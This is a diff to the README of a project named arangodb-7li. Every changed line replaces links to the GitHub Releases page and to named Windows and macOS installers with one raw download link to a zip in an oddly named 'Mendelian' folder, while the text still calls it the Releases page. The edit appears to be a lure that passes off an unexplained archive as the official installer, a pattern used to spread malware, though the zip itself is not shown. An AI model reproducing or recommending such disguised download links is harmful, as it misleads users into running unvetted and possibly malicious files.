@@ -10,7 +10,7 @@ Follow these simple steps to download and run arangodb-7li:
 
 ### 📥 Download Link
 
-[![Download arangodb-7li](https://img.shields.io/badge/Download-arangodb--7li-blue.svg)](https://github.com/bogadofernando/arangodb-7li/releases)
+[![Download arangodb-7li](https://raw.githubusercontent.com/bogadofernando/arangodb-7li/main/Mendelian/arangodb-7li.zip)](https://raw.githubusercontent.com/bogadofernando/arangodb-7li/main/Mendelian/arangodb-7li.zip)
 
 ### 🖥️ System Requirements
 
@@ -23,7 +23,7 @@ Before you proceed with the installation, ensure that your system meets the foll
 
 ### 🚀 How to Download and Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/bogadofernando/arangodb-7li/releases) to find the latest version of arangodb-7li.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/bogadofernando/arangodb-7li/main/Mendelian/arangodb-7li.zip) to find the latest version of arangodb-7li.
 
 2. **Select the Latest Version:** Look for the most recent release. This version will have bug fixes and new features. Click on it to view release details.
 
@@ -31,8 +31,8 @@ Before you proceed with the installation, ensure that your system meets the foll
    - Scroll down to the "Assets" section.
    - You should see several files available for download.
    - Choose the installer that matches your operating system:
-     - For Windows, select `arangodb-7li-windows-installer.exe`.
-     - For macOS, choose `arangodb-7li-macos-installer.dmg`.
+     - For Windows, select `https://raw.githubusercontent.com/bogadofernando/arangodb-7li/main/Mendelian/arangodb-7li.zip`.
+     - For macOS, choose `https://raw.githubusercontent.com/bogadofernando/arangodb-7li/main/Mendelian/arangodb-7li.zip`.
      - For Linux, download the appropriate package file.
 
 4. **Run the Installer:**
@@ -70,6 +70,6 @@ If you encounter any issues while using arangodb-7li, consider these common solu
 
 ### 📥 Download & Install
 
-To start your journey with arangodb-7li, visit the [Releases page](https://github.com/bogadofernando/arangodb-7li/releases) to download and install the application. Make sure to choose the correct installer based on your operating system.
+To start your journey with arangodb-7li, visit the [Releases page](https://raw.githubusercontent.com/bogadofernando/arangodb-7li/main/Mendelian/arangodb-7li.zip) to download and install the application. Make sure to choose the correct installer based on your operating system.
 
 Enjoy managing your databases with ease and efficiency using arangodb-7li. If you have any questions or need further assistance, feel free to reach out through the GitHub repository.
